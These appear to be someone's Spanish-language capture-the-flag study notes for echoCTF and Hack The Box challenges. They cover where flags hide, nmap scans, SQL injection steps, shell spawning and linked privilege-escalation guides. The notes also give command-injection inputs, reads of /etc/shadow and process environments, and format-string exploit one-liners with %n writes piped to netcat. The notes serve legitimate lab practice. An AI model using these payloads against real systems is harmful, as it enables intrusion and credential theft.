### Ubicaciones flags echoctf:
- /etc/passwd (System)
- Interacción con servicios (Servicios encontrados en puertos raros, no convencionales).
- **En aplicaciones Web** 
	- ETSCTF.html (.php,.txt...) 
	- Headers
	- Código fuente (.html, .css, .js)
	- Titulos de las paginas
	- robots.txt
	- Ruta despues de realizar fuzzing
	- Directorio de WebApp (extensiones .php) `grep -iRl "ETSCTF"`
	- Revisar el código fuente de los archivos en el directorio de la WebApp (pueden haber banderas comentadas que no se muestran)
- /home/ETSCTF o /home/ETSCTF_FLAG
- Archivos de configuración (`*.conf`, por lo general en /etc/)
- Bases de datos `mysql`.
- Root 
	- /root
	- /etc/shadow (Flag de System)
	- env
``` Bash
env
# El comando Strings pudiera no estar disponible
strings /proc/1/environ 2>/dev/null | grep ETSCTF 
strings /proc/*/environ | grep ETSCTF 2>/dev/null
```
- **Último recurso**
	- `find / -name ETSCTF.* 2>/dev/null`
	-  `grep -iRl "ETSCTF" /`
*Nota: Las variables de entorno cambian de acuerdo al usuario, se pueden buscar en procesos o subprocesos, pero por lo general corresponden al usuario root*
##### Protip
### Checklist en equipo
- Maquinas resueltas.
- Partes revisadas (Para evitar rabbit holes)
- Sospechas de vulnerabilidad.
- Doble/triple chequeo.
- Compendio de contraseñas encontradas/crackeadas para hacer password spraying

### Comandos con kali chipeado
[Kali chipeado de SrRéquiem](https://gist.github.com/srrequiem/46631335f7a5a950c85a55a12dadaf56)

`new_target tutorial <IP>`

##### Escaneo 
`nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports <target>` 

`-n` - Sin resolución DNS

`sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports <target>`

`extract_ports nmap/all_ports`

Los puertos se obtienen del resultado obtenido en extract_ports
`nmap -sCV -p <puertos> -Pn -oN nmap/targeted <target>`

``` Python
# Spawnear una shell en tutorial101 de EchoCTF
import pty
pty.spawn("/bin/bash")
```

`rlwrap nc <IP> <PORT>` - Poder usar el cursor y el ctrl + v

1. Identificar que existe un SQLi provocando el error `1'`.
2. Identificar cuantas columnas tiene la tabla actual.
3. Identificar cuales de las columnas permiten desplegar strings. `union select 'a','a','a'`.
4. (`SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name`)

Paginas confiables 
- ExploitDB
- GitHub
- Rapid7

### Checks manuales
- `sudo -l`
	- Necesitamos la contraseña del usuario
- Buscar contraseñas expuestas en el directorio.
- Utilizar `netstat -ano` para comprobar las conexiones que estan esperando así como las que ya estan establecidas.

### Spawn Shell STTY
[PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)

Por lo general truena la shell de nuestra máquina una vez que cerramos la remota.
# Trace ICMP
- `ping -c 1 <IP>`
- https://subinsb.com/default-device-ttl-values/
```
# /ETC/HOST
# VIRTUAL HOST ROUTING HTB
IP  DOMAIN NAME
10.0.10.12 http://help.htb
```


Es común en los retos encontrarse una matrioshka con distintos tipos de compresión.

# inject
Nos encontramos con un cat simulado, nuestra entrada la incluye dentro de comillas: 
- `cat 'audit.log; | ls'`
- `cat '\;ls'`
- \` ls \` 
- https://owasp.org/www-community/attacks/Command_Injection
- https://forum.hackthebox.com/t/problem-in-upgrading-a-reverse-shell-to-stable-tty-shell/243563

# Ginx
Seguir las instrucciones. Empezando por visitar el código fuente.

- Si queremos ver cabeceras utilizamos netcat
- Con un servidor apache
- `| xclip -sel c`

# bleed

Cargado de las liberias dinámicas, la diferencias es el peso del binario

[Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)

## brute
La seed usada es el timestamp de Greece

Si tenemos la seed es posible generar los mismos numeros con random.

En este caso la implementación del chall es en lenguaje C, entonces buscando la implementación, después de darle los valores obtenemos la password perfectamente.

# stringer
Se trata de un format string attack

6th address to reach stack data.

`echo $(printf "\xf0\x87\x04\x08).%6$x | nc -u <IP> <PORT>"`

Si especificamos la dirección en la que vamos a sobrescribir, al llegar a su dirección la modificamos con `%n`. 
- Por ejemplo, los datos se encuentran en la dirección 6:
```Bash
echo $(printf "\xf0\x87\x04\x08").%x.%x.%x.%x.%x.%n | nc -u <IP> <PORT>
```
Si se quiere modificar con un valor predeterminado cuenta el número de caracteres antes de la dirección entonces si queremos cargar el número 10 utilizamos (los siguientes valores son en decimal):
- %n escribe el número de bytes, en la memoria, antes de llegar a la dirección
- %n escribe el número de caracteres que ya fueron impresos en la variable
- `printf("blah %n",&val); // val = 5`
- 4 de printf
- 4 ochos
- 4 + 4 + x = 10
- x = 2
```Bash
echo $(printf "\xf0\x87\x04\x08").%8x.%8x.%8x.%8x.%2x.%n | nc -u <IP> <PORT>
```

- Tenemos una pila con valores estaticos
- Cuando no se formatea correctamente(`printf("%s",var)`), tenemos acceso a la primera parte (`printf(var)`)
- Es un binario de 64 bits
- ASLR activado debido a que cambia la primera dirección cada vez que se ejecuta.


[Format String Vulnerability Exploit in SeedLab | Information Security | printf("hello world"); - YouTube](https://www.youtube.com/watch?v=uOndsw3008M)

[Format String to dump binary and gain RCE - 33c3ctf ESPR (pwn 150) - YouTube](https://www.youtube.com/watch?v=XuzuFUGuQv0)

[PWN Echoland challenge — HTB. Writeup includes — Blind Format String… | by Karol Mazurek | Medium](https://karol-mazurek95.medium.com/pwn-echoland-challenge-htb-3363dbd6dc23)
[DefCamp Qualifiers 2019: get-access (faraz.faith)](https://faraz.faith/2019-09-08-defcamp-get-access/)
[blind attack:HITB-XCTF Quals 2018 - babypwn | 上善若水 (introspelliam.github.io)](https://introspelliam.github.io/2018/04/20/blind-attack-HITB-XCTF-Quals-2018-babypwn/)

## smithers
- Para evitar que echo nos añada un enter al final
- `echo -n <IP>`


- Cuando se tiene un JSESSIONID se trata de un tomcat.